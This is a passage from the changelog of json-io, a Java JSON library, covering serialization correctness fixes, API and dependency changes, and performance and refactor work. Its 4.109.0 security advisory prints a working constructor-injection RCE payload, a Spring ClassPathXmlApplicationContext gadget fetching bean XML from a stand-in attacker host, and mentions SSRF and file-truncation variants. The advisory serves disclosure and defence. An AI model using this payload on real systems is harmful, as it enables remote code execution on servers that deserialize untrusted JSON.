...
#### 4.111.0 - 2026-09-18
* **SERIALIZATION (correctness)**: **A Map field's declared generic type was trusted over its real keys, so a null or non-String key either crashed the write or silently wrote `"null"`.** `Map<String, Object>` does not prevent `put(null, v)`, and through a raw reference it does not prevent a key of any type — generics are not enforced at runtime. `writeMapWithStringKeys` nevertheless short-circuited on `declaredKeyType == String.class` and skipped `ensureJsonPrimitiveKeys`, the scan that chooses between the flat `{"k":v}` form and the `@keys`/`@items` two-array form. Having committed to the flat form it met the real key in `writeMapBody`, **after the opening brace was already written**, and threw — `JsonGenerationException: Field name must not be null` for a null key, `ClassCastException` for a non-String one. Because the throw lands mid-write, a caller streaming to an `OutputStream` (an HTTP response) receives a truncated document rather than a clean failure, the same shape as 4.110.0's `SQLException` defect. A bare `Map` handed straight to `toJson` was never affected — it has no declaring field, so the scan always ran — which is why this survived: it takes a FIELD declared with String keys to reach it. **Present since 4.94.0**; 4.30.0 and earlier always inspected the runtime keys. Reported by Evan Berkemeyer against 4.110.0, found while chasing a `findFullSubmission` failure where a lookup table out of sync with its master data produced a null key.
  * The quieter half, in `canStringifyMapKeys`: with `stringifyMapKeys` on, a declared key type that `Converter` can stringify skipped the per-key null check that method's own javadoc promises ("Null keys cause this to return false ... to avoid 'null' ambiguity"), so a null key was written as the literal string `"null"` — **no exception at write time**, and a document that fails on the way back in (`Value 'null' not parseable as an int`). Of the three failure modes this was the worst, because nothing reported it. The conversion question is still answered once from the declared type — that is the point of knowing it — and only the null check is per key.
  * Also fixes the non-String-key `ClassCastException` that callers were working around by forcing `forceMapOutputAsTwoArrays` when cloning maps with enum keys. That workaround is no longer needed.
  * **Behaviour note:** a map with a null or non-String key now emits `@keys`/`@items`, and round-trips — `get(null)` returns its value again. Nothing could have depended on the previous output for those maps: it either threw or failed to read back. Maps whose keys are all non-null Strings are byte-identical to before.
  * `NullMapKeyDeclaredTypeTest` — a null key and an enum key in a `Map<String, Object>` field, a null key under `stringifyMapKeys`, and a bare-map control pinning the path that always worked.
* **API**: **The one-shot JSON string escaper is supported again, and now has a home on `JsonIo`.** `JsonWriter.writeJsonUtf8String(Writer, String)` and its capped overload were deprecated in 4.103.0 when the implementation moved to the package-private `CharStreamGenerator`. The migration note pointed at `JsonGenerator.writeString` via `JsonIo.createGenerator` — public, and the right answer for writing a document — but that is a stateful generator, so there was no longer any public one-liner for *escape this one string into the Writer I already have*: a log line, a hand-built fragment, a value spliced into a template. Both overloads are un-deprecated, with javadoc stating the actual contract (surrounding quotes included, full JSON escaping, a `null` string writes the bare literal `null`, and a string over the cap is refused rather than truncated). The capability also appears now as **`JsonIo.writeJsonString(Writer, String)`** and `(Writer, String, int)` — named for what it does, since it escapes JSON rather than performing UTF-8 encoding. `writeBasicString` stays deprecated deliberately (it writes a quoted string *without* escape-scanning) and so does `writeSingleQuotedString` (JSON5-specific). `WriteJsonStringTest`, including a reflection check that the two statics carry no `@Deprecated`.
* **BUILD**: Runtime dependency `java-util` 4.110.0 → **4.111.0**, which carries two conversion fixes of the same family as its 4.110.0 `"yes"` defect: `"on"` converted to `false`, and surrounding whitespace decided whether a value converted (`" 42 "` worked for `Double` and threw for every other numeric type). Test-scope `jackson-databind` / `jackson-datatype-jsr310` 2.22.1 → **2.22.2**; `maven-bundle-plugin` 6.1.0 → **6.2.0**. Held deliberately, each now carrying its reason in `pom.xml`: `mockito` stays at 4.11.0 (JDK support), `assertj-core` at 3.27.7 (4.0.0-M1 is a milestone, not a release), and `junit-jupiter` at 5.14.4 (JUnit 6 requires Java 17; this project compiles `release 8`). The Spring modules' dependencies are governed by the `spring-boot-dependencies` BOM pinned at the floor and are deliberately not bumped here.

#### 4.110.0 - 2026-08-02
* **SERIALIZATION (correctness)**: **`java.sql.SQLException` could not be serialized at all — and the failure produced a truncated document.** Two defects, and the second did the real damage.
  * **A primitive field that cannot be read crashed instead of being skipped.** Every field on `SQLException` is private and `java.sql` is *exported but not opened*, so no reflective path reaches any of them — `setAccessible` throws `InaccessibleObjectException` for `vendorCode`, `SQLState` and `next` alike. `Accessor.retrieve()` already handles that deliberately, returning `null` so serialization can continue without the restricted field. But the primitive getters unboxed that `null` unchecked — `getInt()` did `((Number) retrieve(o)).intValue()` — and a primitive field can never legitimately be `null`, so the intended graceful skip became a `NullPointerException`. All eight primitive getters now honour the same contract and fall back to the primitive default. **This is general**: it applies to any inaccessible JDK primitive field, not only this one.
  * **The failure truncated the output.** Because the throw happened mid-write, bytes were already on the wire, so a caller received a partial JSON body and no error. That is how it was found: an n-cube `commitBranch` returned HTTP 200 with 381 bytes ending at `` `"SQLState":"23000","vendorCode":` `` — the client saw an unparseable response instead of the actual database error, which cost hours of misdiagnosis. A test now asserts that braces balance and the document ends with `}`.
  * **And the vendor code is the real one.** Fixing the crash alone made `SQLException` write `"vendorCode":0` — a *fabricated* value, which is worse than omitting it, since nothing tells the reader it is wrong. `SQLState` survived only because its getter happens to be named `getSQLState()` and matched the field by name; `vendorCode`'s getter is `getErrorCode()`, which no name-based lookup will find. json-io already has the mechanism for exactly this, and `java.lang.Throwable` already uses it, so `config/nonStandardGetters.txt` gains `java.sql.SQLException = vendorCode:getErrorCode,next:getNextException`. `getNextException()` is included for the same reason — the chained-exception link was silently writing `null` whether or not one existed. Write-side only; reading is handled by `ThrowableFactory`, untouched.
* **BUILD**: Runtime dependency `java-util` 4.109.0 → **4.110.0**, which carries three conversion correctness fixes worth knowing about: `"yes"`/`"Yes"`/`"YES"` converted to `false` (an inversion, not a rejection — `"y"` was already `true`); `Float` → `Double`/`BigDecimal` widened through the bits, so `3.7f` became `3.700000047683716`; and `BigDecimal` → `String` stripped the scale, so `1.50` rendered as `"1.5"` and could not round-trip. Test-scope `jackson-databind` → **2.22.1** — the release that was still absent from Central when 4.109.0 shipped, so the pin can finally be lifted. This supersedes Dependabot #438, which landed 2.21.5 while this release was being prepared; 2.22.1 is newer and is the version the pin was waiting on. `maven-jar-plugin` 3.5.0 → 3.5.1, `maven-bundle-plugin` 6.0.2 → 6.1.0.

#### 4.109.0 - 2026-07-26
* **SECURITY (critical)**: **Fixes a constructor-injection remote-code-execution path reachable when deserializing untrusted input with the default configuration** (`JsonIo.toJava(json, null)`, `ReturnType.JAVA_OBJECTS`). Reported against 4.108.0. The fix ships in `java-util` 4.109.0; this release pins it.
  * **Where the defect was.** json-io trusts `@type` to select a class and passes the sibling JSON fields to that class's constructor. It performs no security checks of its own — every instantiation is delegated to `ClassUtilities.newInstance()`, whose denylist is the sole gate. That gate was not enforced on the path this payload used: `newInstance` routes a map of *named* arguments through `newInstanceWithNamedParameters`, which never called `SecurityChecker.verifyClass()`. A class the checker itself reported as blocked was therefore constructed anyway. The report framed this as an incomplete denylist, but because the PoC flowed entirely through the unchecked path, **adding the gadget class to the list would not have closed it** — the enforcement hole was the vulnerability.
  * **The payload.** `{"@type":"org.springframework.context.support.ClassPathXmlApplicationContext","configLocations":"http://attacker/evil.xml"}`. The plural `configLocations` name-matches the varargs `String...` constructor — named matching widens the single attacker string into a `String[1]`, so every parameter matches — and that constructor calls `refresh()`, loading the attacker's bean XML, which instantiates `ProcessBuilder` with `init-method="start"` inside a Spring child context, beyond the gate's reach. The `Unsupported conversion String->String[]` 500 the reporter observed is downstream noise: the constructor, and therefore the command, had already run. The same primitive also reached `java.net.Socket` (SSRF) and `java.io.FileOutputStream` (arbitrary file create/truncate) using nothing outside `java.base`.
  * **The fix** (in java-util 4.109.0): the gate is enforced at the single public chokepoint outside every `try` — a `SecurityException` raised deeper down was being swallowed by the fallback handlers that retry on `Exception` — and re-asserted on the named-parameter path; name, identity, package-prefix, and supertype checking are unified across both the class-resolution and instantiation layers (previously the prefix rules applied only when loading by name); and the denylist is expanded to cover the gadget families by *supertype name*, so `org.springframework.context.ApplicationContext` covers every `*ApplicationContext` implementation without a Spring dependency. java-util also gains `SecurityChecker.addBlockedClass/addBlockedPackage/allowClass` and matching system properties, so an application can tighten the list or re-enable a type it legitimately constructs.
  * **No behavioral change for callers.** The report suggested defaulting to `returnAsNativeJsonObjects()` (Map/List only, never instantiates arbitrary classes). That was deliberately **not** adopted: it would break every existing caller relying on POJO hydration, and the java-util fix closes the hole without it. The default `ReturnType` is unchanged; upgrading is sufficient. `SECURITY.md` carries the advisory plus hardening guidance for callers who do want the read-only object model.
  * New `ConstructorInjectionSecurityTest` drives the reported payload — and the `Socket`/`FileOutputStream`/JNDI/`ObjectInputStream` variants — through `JsonIo.toJava` against a dependency-free stand-in for `ClassPathXmlApplicationContext`, shaped with the same varargs constructor and constructor side effect, asserting both that the call is refused and that the side effect never fired. Full suite green: 4,748 tests across all three modules.
* **BUILD**: Runtime dependency `java-util` 4.108.0 → 4.109.0 (carries the fix above).

#### 4.108.0 - 2026-07-09
* **BUG FIX**: `CharStreamTokenizer` string slow-path (taken once a JSON string reaches 256 plain characters — the size of the inline `readBuf` — before its first escape) passed the `\` backslash **delimiter** to `readStringWithEscapes` instead of the character *after* it. So `\"` decoded to a literal `\` and the escaped quote then terminated the string one character early, corrupting the value and, inside an object, throwing `Object not ended with '}'`. The borrowed-buffer path, the small-buffer path, and the escape inner-loop all already read the char after the backslash first; only this slow path did not. Fix: after detecting the `\` delimiter, read the following escape character and hand *that* to `readStringWithEscapes` (`in.read()` transparently crosses a `FastReader` buffer refill). Found in the wild by n-cube's *Update from HEAD*, where a large `/cmd` payload carried a merged-PR note containing quotes and `JsonIo.toJava` failed to parse the request. New regression tests `JsonTokenizerTest.escapeAfterLongPlainRun{DecodesCorrectly,ParsesToMap}` sweep pad lengths {256, 300, 1000, 8190, 8200} at both the tokenizer and `JsonIo.toJava`→`Map` levels (red before / green after).
...
* **PERFORMANCE**: `FastIsoParser` — read-side String→java.time conversion tries a strict `java.time` parse before the `Converter`→`DateUtilities` regex path (which re-parsed the ISO-8601 strings json-io itself writes); non-ISO formats fall back unchanged. JSON Read **1.82x → 1.67x**, TOON Read **1.88x → 1.78x**.
...
* **PERFORMANCE**: `ToonWriter` emits java.time values via the `TemporalChars` emitters rather than `Converter`→`DateTimeFormatter` (new `ISO_ZONED_DATE_TIME` variant, parity-pinned), and `MapResolver` gains the typed path's strict-ISO `FastIsoParser` hook. TOON Write **1.49x → 1.32x** / **1.39x → 1.20x**, TOON Read **1.75x → 1.70x**.
...
* **CORRECTNESS**: TOON read/write brought into full conformance with the [toonformat.dev](https://toonformat.dev/) v3.3 spec — the complete upstream fixture suite now passes. User-visible changes: uniform-`Map` arrays emit in tabular form (header + rows); `Long`-overflow literals decode as `BigInteger` instead of silently truncating; quoted strings decode `\uXXXX` escapes; leading-zero forms (`007`) decode as strings; bare-hyphen lines decode as empty objects; tabular header keys are quote-aware. New `ToonSpecFixtureTest` runs the vendored fixtures (refreshable via `scripts/refresh-toon-fixtures.sh`).
...
* **FEATURE**: New TOON `ReadOptions` — `toonExpandPaths(boolean)` for opt-in spec §13.4 dotted-key path expansion (default off, preserves literal dotted keys); `toonIndentSize(int)` for custom decoder indent width when the document uses non-default indentation. Both ship with permanent (JVM-lifetime) siblings: `ReadOptionsBuilder.addPermanentToonExpandPaths(boolean)` and `addPermanentToonIndentSize(int)`.
...
* **REFACTOR**: **JsonWriter dog-food migration complete.** JsonWriter's structural emission (`{`/`}`/`[`/`]`/separators/indents/`@id`/`@type`/`@ref`/`@items`/`@keys`) is now fully driven through `CharStreamGenerator`'s state machine. The parallel `contextStack` state machine + `Deque<WriteContext>` enum + helpers, the `writeKey`/`writeId`/`writeType`/`tabIn`/`tabOut` helpers, the `this.depth` field + 4 indentation-related private fields are all eliminated — gen is the single source of truth. All 13 Jackson-style public API methods on `JsonWriter` delegate to gen. **Behavior changes**: `writeStringField`'s legacy "always emit leading comma" semantics removed (gen auto-decides based on structural position, matching Jackson); pretty-print `name: value` spacing normalized to Jackson convention (see CharStreamGenerator pretty-print FEATURE entry). Migration performed in ~30 incremental perf-validated chunks; full backward compatibility preserved for existing custom writers via narrow snap+restore around the 3 legitimate reset paths. Net JsonWriter code reduction: ~-200 LOC.
* **REFACTOR**: Extracted `JsonTokenizer` (Jackson-style cursor API) and concrete `CharStreamTokenizer` from `JsonParser`; parser now drives parsing through `tokenizer.nextToken()`. JsonParser shrinks from ~1,590 to ~590 lines. Behavior unchanged; prerequisite for Tier 2 eager-POJO-construction work in 4.104.0+. Package-private until then.
* **REFACTOR**: Better-mix `cacheHash` for tokenizer string caches — propagates `len` through one extra multiplication. Both `CharStreamTokenizer.cacheHash` (JSON) and `ToonReader.cacheHash` (TOON + persistent thread-local number cache) updated. Slot-collision rate drops 22.95% → 18.21% on the JsonPerformanceTest workload.
* **REFACTOR**: `JsonParser`/`CharStreamTokenizer` — narrowed several `CharSequence` declarations to `String` where every actual value at the site was already a `String` (the `substitutes` map, field-name handling). Removes two redundant `.toString()` calls and binds field-name comparisons to the faster `StringUtilities.equals(String, String)` overload at six sites.
* **TESTING**: Backward-compat audit against 4.102.0 via a standalone Maven project (8 tests) — exercises legacy `JsonClassWriter`, `WriterContext` API, direct `JsonWriter` instantiation, `JsonIo` facade, builders, pretty-print, cyclic-graph round-trip. Same source compiles and passes against both versions.
* **TESTING**: New `ByteArrayRoundTripTest` (13 cases) covers `JsonGenerator.writeBinary` round-trip, the wrapped/bare format toggle under `showTypeInfoNever()`, ByteBuffer field round-trip, and shared-reference preservation via `@id`/`@ref`.
* **TESTING**: Zero `isEqualToIgnoringWhitespace` assertions remain — the last 3 (`EnumTests` × 2, `PrettyPrintTest`) tightened to byte-for-byte file comparison + gson tree-equality.
